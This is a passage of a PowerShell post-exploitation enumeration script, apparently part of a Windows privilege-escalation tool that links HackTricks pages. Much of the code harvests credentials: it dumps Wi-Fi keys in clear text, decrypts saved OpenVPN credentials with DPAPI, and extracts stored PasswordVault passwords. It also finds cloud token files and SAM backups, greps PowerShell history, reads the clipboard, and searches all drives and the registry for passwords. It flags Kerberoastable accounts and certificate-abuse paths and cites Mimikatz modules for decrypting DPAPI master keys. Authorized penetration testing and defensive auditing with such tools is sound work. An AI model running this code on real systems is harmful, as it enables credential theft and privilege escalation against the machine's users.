Write-Host -ForegroundColor Blue "=========|| INSTALLED APPLICATIONS"
Write-Host "Generating list of installed applications"

#Get applications via Regsitry
Get-InstalledApplications

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| LOOKING FOR BASH.EXE"
Get-ChildItem C:\Windows\WinSxS\ -Filter "amd64_microsoft-windows-lxss-bash*" | ForEach-Object {
  Write-Host $((Get-ChildItem $_.FullName -Recurse -Filter "*bash.exe*").FullName)
}
@("bash.exe", "wsl.exe") | ForEach-Object { Write-Host $((Get-ChildItem C:\Windows\System32\ -Filter $_).FullName) }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| LOOKING FOR SCCM CLIENT"
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * -ErrorAction SilentlyContinue | Select-Object Name, SoftwareVersion
if ($result) { $result }
elseif (Test-Path 'C:\Windows\CCM\SCClient.exe') { Write-Host "SCCM Client found at C:\Windows\CCM\SCClient.exe" -ForegroundColor Cyan }
else { Write-Host "Not Installed." }


######################## NETWORK INFORMATION ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| NETWORK INFORMATION"

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| HOSTS FILE"

Write-Host "Get content of etc\hosts file"
Get-Content "c:\windows\system32\drivers\etc\hosts"

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| IP INFORMATION"

# Get all v4 and v6 addresses
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Ipconfig ALL"
Start-Process ipconfig.exe -ArgumentList "/all" -Wait -NoNewWindow


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| DNS Cache"
ipconfig /displaydns | Select-String "Record" | ForEach-Object { Write-Host $('{0}' -f $_) }
 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| LISTENING PORTS"

# running netstat as powershell is too slow to print to console
Start-Process NETSTAT.EXE -ArgumentList "-ano" -Wait -NoNewWindow


######################## ACTIVE DIRECTORY / IDENTITY MISCONFIG CHECKS ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| ACTIVE DIRECTORY / IDENTITY MISCONFIG CHECKS"

$domainContext = Get-DomainContext
$dcLdapPolicy = Get-LocalDcLdapPolicySummary
if ($dcLdapPolicy.Role -eq 'DomainController') {
  $signing = if ($dcLdapPolicy.SigningState -eq 'Present') {
    switch ($dcLdapPolicy.SigningValue) { 1 { 'None' } 2 { 'Require Signing' } default { 'Unknown' } }
  } elseif ($dcLdapPolicy.SigningState -eq 'Missing' -and $dcLdapPolicy.Generation -eq 'Before2025') {
    'Older DC default: signing not required'
  } else { 'Unknown' }
  $binding = if ($dcLdapPolicy.BindingState -eq 'Present') {
    switch ($dcLdapPolicy.BindingValue) { 0 { 'Never' } 1 { 'When Supported (partial)' } 2 { 'Always' } default { 'Unknown' } }
  } else { 'Unknown' }
  Write-Host ("[i] Local DC LDAP signing: {0} ({1}; {2})" -f $dcLdapPolicy.SigningValue, $dcLdapPolicy.SigningState, $signing)
  Write-Host ("[i] Local DC LDAPS channel binding: {0} ({1}; {2})" -f $dcLdapPolicy.BindingValue, $dcLdapPolicy.BindingState, $binding)
  if ($dcLdapPolicy.SigningState -eq 'Missing' -and $dcLdapPolicy.Generation -ne 'Before2025') {
    Write-Host '[i] Absent signing policy has an unknown effective default; new Server 2025 deployments have different enforcement defaults.'
  }
}
else { Write-Host "[i] Local DC LDAP server policy unknown ($($dcLdapPolicy.Role)); client policy is not a substitute." }

if (-not $domainContext) {
  Write-Host "Host appears to be in a workgroup or the AD context could not be resolved. Skipping domain-specific checks." -ForegroundColor DarkGray
}
else {
  $ntlmStatus = Get-NtlmPolicySummary
  if ($ntlmStatus) {
    $recvValue = if ($ntlmStatus.RestrictReceiving -ne $null) { [int]$ntlmStatus.RestrictReceiving } else { -1 }
    $sendValue = if ($ntlmStatus.RestrictSending -ne $null) { [int]$ntlmStatus.RestrictSending } else { -1 }
    $lmValue = if ($ntlmStatus.LmCompatibility -ne $null) { [int]$ntlmStatus.LmCompatibility } else { -1 }
    $ntlmMsg = "Receiving:{0} Sending:{1} LMCompat:{2}" -f $recvValue, $sendValue, $lmValue
    if ($recvValue -ge 1 -or $sendValue -ge 1 -or $lmValue -ge 5) {
      Write-Host "[!] NTLM is restricted/disabled ($ntlmMsg). Expect Kerberos-only auth paths (sync time before Kerberoasting)." -ForegroundColor Yellow
    }
    else {
      Write-Host "[i] NTLM restrictions appear relaxed ($ntlmMsg)."
    }
  }

  $machineQuota = Get-DomainMachineAccountQuota -DomainContext $domainContext
  if ($machineQuota.State -eq 'Present') {
    Write-Host "[i] ms-DS-MachineAccountQuota: $($machineQuota.Value) (domain setting; caller creation rights and remaining quota unverified)."
  }
  else { Write-Host "[i] ms-DS-MachineAccountQuota unavailable ($($machineQuota.State))." }

  $timeSkew = Get-TimeSkewInfo -DomainContext $domainContext
  if ($timeSkew) {
    $offsetAbs = [math]::Abs($timeSkew.OffsetSeconds)
    $timeMsg = "Offset vs {0}: {1:N3}s (sample: {2})" -f $timeSkew.Source, $timeSkew.OffsetSeconds, $timeSkew.RawSample.Trim()
    if ($offsetAbs -gt 5) {
      Write-Host "[!] Significant Kerberos time skew detected - $timeMsg" -ForegroundColor Yellow
    }
    else {
      Write-Host "[i] Kerberos time offset looks OK - $timeMsg"
    }
  }

  $dnsReport = Get-WeakDnsUpdateFindings -DomainContext $domainContext
  if ($dnsReport.Findings.Count -gt 0) {
    Write-Host "[?] AD-integrated DNS zone ACL review signals (effective dnsNode creation/write rights unverified):" -ForegroundColor Yellow
    $dnsReport.Findings | Format-Table Zone,Partition,Principal,Rights,Scope -AutoSize -Wrap | Out-String | Write-Host
    Write-Host "[i] Allow ACEs can be limited by deny ACEs, object scope, and DNS policy; these signals do not establish DNS write access or relay viability."
  }
  else {
    Write-Host "[i] No DNS zone ACL review signals in $($dnsReport.Inspected) inspected zone(s)."
  }
  if ($dnsReport.Unavailable.Count -gt 0) {
    Write-Host "[?] DNS ACL enumeration unavailable for: $($dnsReport.Unavailable -join ', '). Coverage is unknown." -ForegroundColor Yellow
  }
  if ($dnsReport.Truncated.Count -gt 0) {
    Write-Host "[?] DNS ACL enumeration truncated for: $($dnsReport.Truncated -join ', '). Remaining zones or ACEs were not inspected." -ForegroundColor Yellow
  }

  $spnReport = Get-PrivilegedSpnTargets -DomainContext $domainContext
  if ($spnReport.State -eq 'Unknown') {
    Write-Host "[?] Service-user SPN visibility unknown (LDAP denied or timed out)." -ForegroundColor Yellow
  }
  else {
    Write-Host "[i] Inspected $($spnReport.Inspected) SPN objects; enabled service-user accounts: $($spnReport.Enabled); eligibility unknown: $($spnReport.UnknownEligibility)."
    if ($spnReport.Rows.Count -gt 0) {
      $spnReport.Rows | Format-Table User,Tier,SPN,EncFlags,Groups -AutoSize -Wrap | Out-String | Write-Host
    }
    if ($spnReport.Truncated) { Write-Host "[?] LDAP sample or elapsed limit reached; remaining account count and priority unknown." -ForegroundColor Yellow }
    if ($spnReport.Omitted -gt 0) { Write-Host "[i] $($spnReport.Omitted) additional enabled service-user SPN account(s) omitted from display." }
    Write-Host "[i] SPNs and encryption flags do not prove a weak password, ticket type, or service-key possession."
  }

  $gmsaReport = Get-GmsaReadersReport -DomainContext $domainContext
  if ($gmsaReport.Rows.Count -gt 0) {
    $weakGmsa = $gmsaReport.Rows | Where-Object { $_.WeakPrincipals -ne "" }
    if ($weakGmsa) {
      Write-Host "[?] gMSA membership DACLs mention broad trustees; ACE rights and effective access are unverified:" -ForegroundColor Yellow
      $weakGmsa | Select-Object Account,@{Name='DaclTrustees';Expression={$_.WeakPrincipals}} | Format-Table -AutoSize | Out-String | Write-Host
    }
    else {
      Write-Host "[i] gMSA membership DACL trustees found (ACE rights and effective access unverified)."
      $gmsaReport.Rows | Select-Object Account,@{Name='DaclTrustees';Expression={$_.Trustees}} | Sort-Object Account | Select-Object -First 5 | Format-Table -Wrap | Out-String | Write-Host
    }
  }
  else {
    Write-Host "[?] No gMSA membership DACL trustees returned in $($gmsaReport.Inspected) inspected object(s); LDAP or descriptor visibility may be incomplete."
  }
  if ($gmsaReport.Omitted -gt 0) { Write-Host "[i] $($gmsaReport.Omitted) additional gMSA trustee row(s) omitted from display." }
  if ($gmsaReport.State -ne 'Observed') {
    Write-Host "[?] gMSA reader inventory $($gmsaReport.State.ToLowerInvariant()): sample, descriptor, or elapsed limit reached (or LDAP unavailable). Remaining access is unknown." -ForegroundColor Yellow
  }

  $adcsInfo = Get-AdcsSchannelInfo
  if ($adcsInfo.MappingValue -ne $null) {
    $hex = ('0x{0:X}' -f [int]$adcsInfo.MappingValue)
    if ($adcsInfo.UpnMapping) {
      Write-Host ("[!] Schannel CertificateMappingMethods={0} (UPN mapping allowed) - ESC10 certificate abuse possible if you can edit another user's UPN." -f $hex) -ForegroundColor Yellow
    }
    else {
      Write-Host ("[i] Schannel CertificateMappingMethods={0} (UPN mapping flag not set)." -f $hex)
    }
    if ($adcsInfo.ServiceState) {
      Write-Host ("[i] AD CS service state: {0}" -f $adcsInfo.ServiceState)
    }
  }
  else {
    Write-Host "[i] Could not read Schannel certificate mapping configuration." -ForegroundColor DarkGray
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| ARP Table"

# Arp table info
Start-Process arp -ArgumentList "-A" -Wait -NoNewWindow

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Routes"

# Route info
Start-Process route -ArgumentList "print" -Wait -NoNewWindow

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Network Adapter info"

# Network Adapter info
Get-NetAdapter | ForEach-Object { 
  Write-Host "----------"
  Write-Host $_.Name
  Write-Host $_.InterfaceDescription
  Write-Host $_.ifIndex
  Write-Host $_.Status
  Write-Host $_.MacAddress
  Write-Host "----------"
} 


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for WiFi passwords"
# Select all wifi adapters, then pull the SSID along with the password

((netsh.exe wlan show profiles) -match '\s{2,}:\s').replace("    All User Profile     : ", "") | ForEach-Object {
  netsh wlan show profile name="$_" key=clear 
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Enabled firewall rules - displaying command only - it can overwrite the display buffer"
Write-Host -ForegroundColor Blue "=========|| show all rules with: netsh advfirewall firewall show rule dir=in name=all"
# Route info

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| SMB SHARES"
Write-Host "Will enumerate SMB Shares and Access if any are available" 

Get-SmbShare | Get-SmbShareAccess | ForEach-Object {
  $SMBShareObject = $_
# see line 70 for explanation of what this does
  whoami.exe /groups /fo csv | select-object -skip 2 | ConvertFrom-Csv -Header 'group name' | Select-Object -ExpandProperty 'group name' | ForEach-Object {
    if ($SMBShareObject.AccountName -like $_ -and ($SMBShareObject.AccessRight -like "Full" -or "Change") -and $SMBShareObject.AccessControlType -like "Allow" ) {
      Write-Host -ForegroundColor red "$($SMBShareObject.AccountName) has $($SMBShareObject.AccessRight) to $($SMBShareObject.Name)"
    }
  }
}


######################## USER INFO ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| USER INFO"
Write-Host "== || Generating List of all Local Administrators, Users and Backup Operators (if any exist)"

# Code has been modified to accomodate for any language by filtering only on the output and not looking for a string of text
# Foreach loop to get all local groups, then examine each group's members.
Get-LocalGroup | ForEach-Object {
  "`n Group: $($_.Name) `n"
  if(Get-LocalGroupMember -name $_.Name){
    (Get-LocalGroupMember -name $_.Name).Name
  }
  else{
    "     {GROUP EMPTY}"
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| USER DIRECTORY ACCESS CHECK"
Get-ChildItem C:\Users\* | ForEach-Object {
  if (Get-ChildItem $_.FullName -ErrorAction SilentlyContinue) {
    Write-Host -ForegroundColor red "Read Access to $($_.FullName)"
  }
}

#Whoami 
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| WHOAMI INFO"
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Check Token access here: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#abusing-tokens"
Write-Host -ForegroundColor Blue "=========|| Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeManageVolumePrivilege, SeEnableDelegationPrivilege"
Write-Host "[i] If SeEnableDelegationPrivilege is enabled in this process token, review domain machine-account quota and effective computer-object rights; the privilege alone does not prove a delegation path."
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups" -ForegroundColor Yellow
Start-Process whoami.exe -ArgumentList "/all" -Wait -NoNewWindow


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Cloud Credentials Check"
$Users = (Get-ChildItem C:\Users).Name
$CCreds = @(".aws\credentials",
  "AppData\Roaming\gcloud\credentials.db",
  "AppData\Roaming\gcloud\legacy_credentials",
  "AppData\Roaming\gcloud\access_tokens.db",
  ".azure\accessTokens.json",
  ".azure\azureProfile.json") 
foreach ($u in $users) {
  $CCreds | ForEach-Object {
    if (Test-Path "c:\Users\$u\$_") { Write-Host "$_ found!" -ForegroundColor Red }
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| APPcmd Check"
if (Test-Path ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
  Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe" -ForegroundColor Yellow
  Write-Host "$Env:SystemRoot\System32\inetsrv\appcmd.exe exists!" -ForegroundColor Red
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| OpenVPN Credentials Check"

$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs" -ErrorAction SilentlyContinue
if ($Keys) {
  Add-Type -AssemblyName System.Security
  $items = $keys | ForEach-Object { Get-ItemProperty $_.PsPath }
  foreach ($item in $items) {
    $encryptedbytes = $item.'auth-data'
    $entropy = $item.'entropy'
    $entropy = $entropy[0..(($entropy.Length) - 2)]

    $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
      $encryptedBytes, 
      $entropy, 
      [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
    Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| PowerShell History (Password Search Only)"

Write-Host "=|| PowerShell Console History"
Write-Host "=|| To see all history, run this command: Get-Content (Get-PSReadlineOption).HistorySavePath"
Write-Host $(Get-Content (Get-PSReadLineOption).HistorySavePath | Select-String pa)

Write-Host "=|| AppData PSReadline Console History "
Write-Host "=|| To see all history, run this command: Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
Write-Host $(Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | Select-String pa)


Write-Host "=|| PowerShell default transcript history check "
if (Test-Path $env:SystemDrive\transcripts\) { "Default transcripts found at $($env:SystemDrive)\transcripts\" }


# Enumerating Environment Variables
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| ENVIRONMENT VARIABLES "
Write-Host "Maybe you can take advantage of modifying/creating a binary in some of the following locations"
Write-Host "PATH variable entries permissions - place binary or DLL to execute instead of legitimate"
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking" -ForegroundColor Yellow

Get-ChildItem env: | Format-Table -Wrap


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Sticky Notes Check"
if (Test-Path "C:\Users\$env:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite") {
  Write-Host "Sticky Notes database found. Could have credentials in plain text: "
  Write-Host "C:\Users\$env:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite"
}

# Check for Cached Credentials
# https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/getting-cached-credentials
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Cached Credentials Check"
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#windows-vault" -ForegroundColor Yellow 
cmdkey.exe /list

# Check for UWP PasswordVault / Credential Locker Check
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| UWP PasswordVault / Credential Locker Check"
Write-Host "https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#uwp-passwordvault--credential-locker" -ForegroundColor Yellow 
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for DPAPI RPC Master Keys"
Write-Host "Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt"
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi" -ForegroundColor Yellow

$appdataRoaming = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\"
$appdataLocal = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\"
if ( Test-Path "$appdataRoaming\Protect\") {
  Write-Host "found: $appdataRoaming\Protect\"
  Get-ChildItem -Path "$appdataRoaming\Protect\" -Force | ForEach-Object {
    Write-Host $_.FullName
  }
}
if ( Test-Path "$appdataLocal\Protect\") {
  Write-Host "found: $appdataLocal\Protect\"
  Get-ChildItem -Path "$appdataLocal\Protect\" -Force | ForEach-Object {
    Write-Host $_.FullName
  }
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Checking for DPAPI Cred Master Keys"
Write-Host "Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt" 
Write-Host "You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module" 
Write-Host "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi" -ForegroundColor Yellow

if ( Test-Path "$appdataRoaming\Credentials\") {
  Get-ChildItem -Path "$appdataRoaming\Credentials\" -Force
}
if ( Test-Path "$appdataLocal\Credentials\") {
  Get-ChildItem -Path "$appdataLocal\Credentials\" -Force
}


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Current Logged on Users"
try { quser }catch { Write-Host "'quser' command not not present on system" } 


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Remote Sessions"
try { qwinsta } catch { Write-Host "'qwinsta' command not present on system" }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Kerberos tickets (does require admin to interact)"
try { klist } catch { Write-Host "No active sessions" }


Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Printing ClipBoard (if any)"
Get-ClipBoardText

######################## File/Credentials check ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Unattended Files Check"
@("C:\Windows\sysprep\sysprep.xml",
  "C:\Windows\sysprep\sysprep.inf",
  "C:\Windows\sysprep.inf",
  "C:\Windows\Panther\Unattended.xml",
  "C:\Windows\Panther\Unattend.xml",
  "C:\Windows\Panther\Unattend\Unattend.xml",
  "C:\Windows\Panther\Unattend\Unattended.xml",
  "C:\Windows\System32\Sysprep\unattend.xml",
  "C:\Windows\System32\Sysprep\unattended.xml",
  "C:\unattend.txt",
  "C:\unattend.inf") | ForEach-Object {
  if (Test-Path $_) {
    Write-Host "$_ found."
  }
}


######################## GROUP POLICY RELATED CHECKS ########################
Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| SAM / SYSTEM Backup Checks"

@(
  "$Env:windir\repair\SAM",
  "$Env:windir\System32\config\RegBack\SAM",
  "$Env:windir\System32\config\SAM",
  "$Env:windir\repair\system",
  "$Env:windir\System32\config\SYSTEM",
  "$Env:windir\System32\config\RegBack\system") | ForEach-Object {
  if (Test-Path $_ -ErrorAction SilentlyContinue) {
    Write-Host "$_ Found!" -ForegroundColor red
  }
}

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Group Policy Password Check"

$GroupPolicy = @("Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml")
if (Test-Path "$env:SystemDrive\Microsoft\Group Policy\history") {
  Get-ChildItem -Recurse -Force "$env:SystemDrive\Microsoft\Group Policy\history" -Include @GroupPolicy
}

if (Test-Path "$env:SystemDrive\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history" ) {
  Get-ChildItem -Recurse -Force "$env:SystemDrive\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history"
}

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Recycle Bin TIP:"
Write-Host "If credentials are found in the recycle bin, tool from nirsoft may assist: http://www.nirsoft.net/password_recovery_tools.html" -ForegroundColor Yellow

######################## File/Folder Check ########################

Write-Host ""
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========||  Password Check in Files/Folders"

# Looking through the entire computer for passwords
# Also looks for MCaffee site list while looping through the drives.
if ($TimeStamp) { TimeElapsed }
Write-Host -ForegroundColor Blue "=========|| Password Check. Starting at root of each drive. This will take some time. Like, grab a coffee or tea kinda time."
Write-Host -ForegroundColor Blue "=========|| Looking through each drive, searching for $fileExtensions"
# Check if the Excel com object is installed, if so, look through files, if not, just notate if a file has "user" or "password in name"
try { 
  New-Object -ComObject Excel.Application | Out-Null
  $ReadExcel = $true 
}
catch {
  $ReadExcel = $false
  if($Excel) {
    Write-Host -ForegroundColor Yellow "Host does not have Excel COM object, will still point out excel files when found."  
  }
}
$Drives.Root | ForEach-Object {
  $Drive = $_
  Get-ChildItem $Drive -Recurse -Include $fileExtensions -ErrorAction SilentlyContinue -Force | ForEach-Object {
    $path = $_
    #Exclude files/folders with 'lang' in the name
    if ($Path.FullName | select-string "(?i).*lang.*"){
      #Write-Host "$($_.FullName) found!" -ForegroundColor red
    }
    if($Path.FullName | Select-String "(?i).:\\.*\\.*Pass.*"){
      write-host -ForegroundColor Blue "$($path.FullName) contains the word 'pass'"
    }
    if($Path.FullName | Select-String ".:\\.*\\.*user.*" ){
      Write-Host -ForegroundColor Blue "$($path.FullName) contains the word 'user' -excluding the 'users' directory"
    }
    # If path name ends with common excel extensions
    elseif ($Path.FullName | Select-String ".*\.xls",".*\.xlsm",".*\.xlsx") {
      if ($ReadExcel -and $Excel) {
        Search-Excel -Source $Path.FullName -SearchText "user"
        Search-Excel -Source $Path.FullName -SearchText "pass"
      }
    }
    else {
      if ($path.Length -gt 0) {
        # Write-Host -ForegroundColor Blue "Path name matches extension search: $path"
      }
      if ($path.FullName | Select-String "(?i).*SiteList\.xml") {
        Write-Host "Possible MCaffee Site List Found: $($_.FullName)"
        Write-Host "Just going to leave this here: https://github.com/funoverip/mcafee-sitelist-pwd-decryption" -ForegroundColor Yellow
      }
      $regexSearch.keys | ForEach-Object {
        $passwordFound = Get-Content $path.FullName -ErrorAction SilentlyContinue -Force | Select-String $regexSearch[$_] -Context 1, 1
        if ($passwordFound) {
          Write-Host "Possible Password found: $_" -ForegroundColor Yellow
          Write-Host $Path.FullName
          Write-Host -ForegroundColor Blue "$_ triggered"
          Write-Host $passwordFound -ForegroundColor Red
        }
      }
    }  
  }
}

######################## Registry Password Check ########################

Write-Host -ForegroundColor Blue "=========|| Registry Password Check"
# Looking through the entire registry for passwords
Write-Host "This will take some time. Won't you have a pepsi?"
$regPath = @("registry::\HKEY_CURRENT_USER\", "registry::\HKEY_LOCAL_MACHINE\")
# Search for the string in registry values and properties
foreach ($r in $regPath) {
(Get-ChildItem -Path $r -Recurse -Force -ErrorAction SilentlyContinue) | ForEach-Object {
    $property = $_.property
    $Name = $_.Name
    $property | ForEach-Object {
      $Prop = $_
      $regexSearch.keys | ForEach-Object {
        $value = $regexSearch[$_]
        if ($Prop | Where-Object { $_ -like $value }) {
          Write-Host "Possible Password Found: $Name\$Prop"
          Write-Host "Key: $_" -ForegroundColor Red
        }
        $Prop | ForEach-Object {   
          $propValue = (Get-ItemProperty "registry::$Name").$_
          if ($propValue | Where-Object { $_ -like $Value }) {
            Write-Host "Possible Password Found: $name\$_ $propValue"
          }
        }
      }
    }
  }
  if ($TimeStamp) { TimeElapsed }
  Write-Host "Finished $r"
}
